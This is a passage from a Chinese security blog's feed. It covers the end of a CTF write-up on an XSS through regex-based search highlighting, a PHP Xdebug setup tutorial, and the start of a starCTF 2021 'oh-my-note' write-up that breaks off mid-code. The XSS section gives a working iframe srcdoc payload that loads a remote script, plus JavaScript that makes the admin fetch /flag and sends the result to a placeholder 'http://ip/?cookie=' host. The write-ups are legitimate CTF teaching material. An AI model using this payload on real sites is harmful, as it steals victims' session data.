&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174349.png&#34; alt=&#34;image-20210220174348492&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;如果按照正常思维来查找&amp;rsquo;a&amp;rsquo;字符串的话，效果就如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174512.png&#34; alt=&#34;image-20210220174510622&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;但是我们应当注意到，这个高亮实际上还是由&lt;code&gt;String.prototype.replace()&lt;/code&gt;方法来进行&lt;strong&gt;正则替换&lt;/strong&gt;的，那么我们如果输入&lt;code&gt;.*&lt;/code&gt;之类的关键词进行高亮就会出现意想不到的效果：
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174753.png&#34; alt=&#34;image-20210220174752450&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;没错，因为正则替换让我们得以有机可乘&lt;/p&gt;
&lt;p&gt;思路还是一样，先利用替换构造好XSS，再利用&lt;code&gt;&amp;lt;iframe src=&#39;https://anthem-whisper.github.io/preview&#39;&amp;gt;&lt;/code&gt;来触发0-click&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;iframe src=&#39;https://anthem-whisper.github.io/preview&#39;&amp;gt;
&amp;lt;iframe src=&#39;AAA&#39; &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;替换的payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;AAA(&#39;srcdoc=&#39;&amp;amp;lt;img src=1 onerror=document.write(atob(&amp;amp;#x27;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg==&amp;amp;#x27;));&amp;amp;gt;&#39;)*
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;替换之后其实是这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175915.png&#34; alt=&#34;image-20210220175913943&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;实际上是利用了iframe标签的srcdoc属性和HTML实体编码来绕过&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;iframe src=&amp;quot;&amp;lt;b class=&amp;amp;quot;search_result&amp;amp;quot;&amp;gt;AAA(&amp;quot; srcdoc=&amp;quot;&amp;lt;img src=1 onerror=document.write(atob(&#39;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg==&#39;));&amp;gt;&amp;quot; )*&amp;lt;=&amp;quot;&amp;quot; b=&amp;quot;&amp;quot;&amp;gt;&#39; &amp;gt;&amp;lt;/iframe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结果一目了然；&lt;/p&gt;
&lt;p&gt;而iframe里面&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;指向的JS：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;nx&#34;&gt;xmlhttp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//是否能跨域
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;xmlhttp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;withCredentials&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;xmlhttp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;onreadystatechange&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;xmlhttp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;readyState&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;href&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://ip/?cookie=&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;btoa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;xmlhttp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;responseText&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//得用btoa()进行base64编码，不然flag会很神必
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;//尝试getAllResponseHeaders()不行，因为HttpOnly的Set-Cookie头不适用
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//设置连接信息
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//第一个参数表示http的请求方式，支持所有http的请求方式，主要使用get和post
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//第二个参数表示请求的url地址，get方式请求的参数也在url中
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//第三个参数表示采用异步还是同步方式交互，true表示异步
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;xmlhttp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/flag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//4.发送数据，开始和服务器端进行交互
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//同步方式下，send这句话会在服务器段数据回来后才执行完
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//异步方式下，send这句话会立即完成执行
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;xmlhttp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不能绕HttpOnly来获取cookie，但是我们可以直接让admin请求&lt;code&gt;/flag&lt;/code&gt;，把responseText发给我们就行了；&lt;/p&gt;
&lt;p&gt;这个是本地打的结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220172735.png&#34; alt=&#34;image-20210220172727362&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;大手一抖，flag到手：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175431.png&#34; alt=&#34;image-20210220175430475&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;因为flag里面出题人故意放了&lt;code&gt;&amp;amp;&lt;/code&gt;字符让我们踩坑，打出来的responseText需要base64编码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175441.png&#34; alt=&#34;image-20210220172930232&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;下面这个才对。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175445.png&#34; alt=&#34;image-20210220173313149&#34;  /&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Debian下PHP Xdebug调试环境搭建</title>
        <link>https://anthem-whisper.github.io/p/debian%E4%B8%8Bphp-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
        <pubDate>Fri, 19 Feb 2021 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/debian%E4%B8%8Bphp-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
        <description>&lt;h1 id=&#34;debian下php-xdebug调试环境搭建&#34;&gt;Debian下PHP Xdebug调试环境搭建&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;本文永久链接：http://wh1sper.com/debian%e4%b8%8bphp-xdebug%e8%b0%83%e8%af%95%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;
&lt;p&gt;Xdebug是PHP的扩展，用于协助调试和开发。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;它包含一个用于IDE的调试器&lt;/li&gt;
&lt;li&gt;它升级了PHP的&lt;code&gt;var_dump()&lt;/code&gt;函数&lt;/li&gt;
&lt;li&gt;它为通知，警告，错误和异常添加了堆栈跟踪&lt;/li&gt;
&lt;li&gt;它具有记录每个函数调用和磁盘变量赋值的功能&lt;/li&gt;
&lt;li&gt;它包含一个分析器&lt;/li&gt;
&lt;li&gt;它提供了与PHPUnit一起使用的代码覆盖功能。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本地跟代码必备的工具。
但不推荐在生产环境中使用xdebug，因为他太重了。&lt;/p&gt;
&lt;h3 id=&#34;预置环境&#34;&gt;预置环境&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;OS: Kali GNU/Linux Rolling x86_64&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Kernel: 5.7.0-kali1-amd64&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PHP version: 7.4.14&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Server API: FPM/FastCGI&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;nginx version: nginx/1.18.0&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PhpStorm version: 2020.3&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;下载安装xdebug&#34;&gt;下载安装Xdebug&lt;/h3&gt;
&lt;p&gt;访问&lt;a class=&#34;link&#34; href=&#34;https://xdebug.org/wizard&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xdebug.org/wizard&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在web服务器中放入phpinfo，（注意最好是使用web服务，如果是本地php脚本的话&lt;code&gt;php.ini&lt;/code&gt;可能会不一样）&lt;/p&gt;
&lt;p&gt;访问之后将整个页面源码&lt;code&gt;Ctrl+A  Ctrl+C&lt;/code&gt;复制到框里面：
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210219110804.png&#34; alt=&#34;image-20210219110753403&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;分析之后会自动给你最合适的版本，并且告诉你后续安装步骤。&lt;/p&gt;
&lt;p&gt;下载给出的&lt;code&gt;.tar.tgz&lt;/code&gt;文件&lt;/p&gt;
&lt;p&gt;1.安装PHP拓展&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get install php-dev autoconf automake
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.解压&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar -xvzf xdebug-3.0.2.tgz
cd xdebug-3.0.2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.执行以下命令，如果报错&lt;code&gt;Command not found&lt;/code&gt;，那就先执行&lt;code&gt;1.&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;phpize
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完成之后会输出类似于以下内容，因环境而异，具体还请参考&lt;a class=&#34;link&#34; href=&#34;https://xdebug.org/wizard&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xdebug.org/wizard&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Configuring for:
...
Zend Module Api No:      20190902
Zend Extension Api No:   320190902
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;随后分别需要执行&lt;code&gt;./configure&lt;/code&gt;和&lt;code&gt;make&lt;/code&gt;以及&lt;code&gt;cp&lt;/code&gt;等命令，因环境而异，具体参考&lt;a class=&#34;link&#34; href=&#34;https://xdebug.org/wizard&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://xdebug.org/wizard&lt;/a&gt;，这里不再累述。&lt;/p&gt;
&lt;h3 id=&#34;配置xdebug&#34;&gt;配置Xdebug&lt;/h3&gt;
&lt;p&gt;打开&lt;code&gt;php.ini&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在末尾写入（最好去掉注释）：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[xdebug]
#pay attention,xdebug3 is different from 2
zend_extension = /usr/lib/php/20190902/xdebug.so#这里位置因环境而异
xdebug.mode=debug
xdebug.remote_handler = dbgp
xdebug.client_host = 127.0.0.1 #安装有PhpStorm的机器
xdebug.client_port = 9001 #端口可修改，防止冲突
xdebug.remote_mode=req #可以设为req或jit，req表示脚本一开始运行就连接远程客户端，jit表示脚本出错时才连接远程客户端。
xdebug.idekey = PHPSTROM
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;**注意：**如果你想 Xdebug 和 OPCache 一起使用，必须在 OPCache 之后加载 Xdebug &lt;code&gt;zend_extension&lt;/code&gt; 代码行。&lt;/p&gt;
&lt;p&gt;因为我下载的版本是Xdebug3，相对于Xdebug2，&lt;code&gt;remote_enable&lt;/code&gt;被&lt;code&gt;mode&lt;/code&gt;取代，&lt;code&gt;remote_host&lt;/code&gt;被&lt;code&gt;client_host&lt;/code&gt;取代，&lt;code&gt;remote_port&lt;/code&gt;改为&lt;code&gt;client_port&lt;/code&gt;，默认为&lt;code&gt;9003&lt;/code&gt;端口，&lt;code&gt;client_host&lt;/code&gt;默认为&lt;code&gt;localhost&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;如果你下载的是Xdebug2：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[xdebug]
zend_extension= /usr/lib/php/20190902/xdebug.so
xdebug.remote_enable = on
xdebug.remote_port = 9001
xdebug.remote_host = 127.0.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;写入完毕后，重启&lt;code&gt;php-fpm&lt;/code&gt;或者重启&lt;code&gt;apache&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;之后再次访问&lt;code&gt;phpinfo&lt;/code&gt;，按&lt;code&gt;Ctrl+F&lt;/code&gt;搜索&lt;code&gt;Xdebug&lt;/code&gt;，成功的话你会看到和下面差不多的情况&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210219114515.png&#34; alt=&#34;image-20210219114506481&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;配置phpstorm&#34;&gt;配置PhpStorm&lt;/h3&gt;
&lt;p&gt;打开PhpStorm；&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;File-&amp;gt;Languages &amp;amp; Frameworks-&amp;gt;PHP&lt;/code&gt;下，选择&lt;code&gt;CLI interpreter&lt;/code&gt;为你刚才配置的PHP版本&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210219114829.png&#34; alt=&#34;image-20210219114827373&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;成功的话会出现Xdebug的字样&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210219114938.png&#34; alt=&#34;image-20210219114935735&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;没有的话重新打开&lt;code&gt;php.ini&lt;/code&gt;配置&lt;/p&gt;
&lt;p&gt;选择Debug分支，保证&lt;code&gt;port&lt;/code&gt;和&lt;code&gt;php.ini&lt;/code&gt;中的一致&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210219115308.png&#34; alt=&#34;image-20210219115215244&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;配置DBGp Proxy，一样。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210219115423.png&#34; alt=&#34;image-20210219115420206&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;配置Server&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210219115553.png&#34; alt=&#34;image-20210219115540815&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;点击右上角，编辑配置&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210219115808.png&#34; alt=&#34;image-20210219115806714&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;在Server下拉框中，选择我们在第4步设置的Server服务名称（之前配置的Server），Browser选择你要使用的浏览器&lt;/p&gt;
&lt;p&gt;ALL Right;&lt;/p&gt;
&lt;h3 id=&#34;配置firefox&#34;&gt;配置FireFox&lt;/h3&gt;
&lt;p&gt;这一步可以不需要，不过配置之后方便一点；&lt;/p&gt;
&lt;p&gt;FireFox访问https://addons.mozilla.org/en-US/firefox/addon/xdebug-helper-for-firefox/，安装插件。&lt;/p&gt;
&lt;p&gt;安装完成之后，开启插件，给程序下个断点，访问，如果成功PhpStorm会自动跳出来：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210219120209.png&#34; alt=&#34;image-20210219120207661&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;好了，到这里我们就配置完成了。&lt;/p&gt;
&lt;p&gt;随后携带&lt;code&gt;Cookie: XDEBUG_SESSION=&amp;quot;ECLIPSE&amp;quot;&lt;/code&gt;头访问（或者开FireFox插件，一个道理）就可以进入debug了&lt;/p&gt;
&lt;p&gt;另外在&lt;code&gt;nginx.conf&lt;/code&gt;里面设置&lt;code&gt;fastcgi_read_timeout 600&lt;/code&gt;可以调整fastcgi进程向 nginx 进程发送输出过程的超时时间，默认值60秒，让调试得到时间&lt;/p&gt;
</description>
        </item>
        <item>
        <title>starCTF 2021 复现</title>
        <link>https://anthem-whisper.github.io/p/starctf-2021-%E5%A4%8D%E7%8E%B0/</link>
        <pubDate>Tue, 19 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/starctf-2021-%E5%A4%8D%E7%8E%B0/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228100314.jpeg" alt="Featured image of post starCTF 2021 复现" /&gt;&lt;h3 id=&#34;oh-my-note&#34;&gt;oh-my-note&lt;/h3&gt;
&lt;p&gt;考点：时间戳爆破&lt;/p&gt;
&lt;h4 id=&#34;题目分析&#34;&gt;题目分析&lt;/h4&gt;
&lt;p&gt;先给了源码：&lt;a class=&#34;link&#34; href=&#34;https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/XCTF-starCTF2021/%5BstarCTF2021%5Doh-my-note.zip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;source.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144005.png&#34; alt=&#34;image-20210118212334753&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;题目是一个留言板，发布留言的时候输入用户名可以选择为公开或者私有&lt;/p&gt;
&lt;h4 id=&#34;代码审计&#34;&gt;代码审计&lt;/h4&gt;
&lt;p&gt;打开源码，审计；&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;create_note()&lt;/code&gt;函数中，如果用户不存在，就会自动创建&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@app.route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/create_note&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;methods&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;create_note&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CreateNoteForm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;title&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;prv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;private&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;filter_by&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;first&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;timestamp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;round&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;seed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;timestamp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;user_id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get_random_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
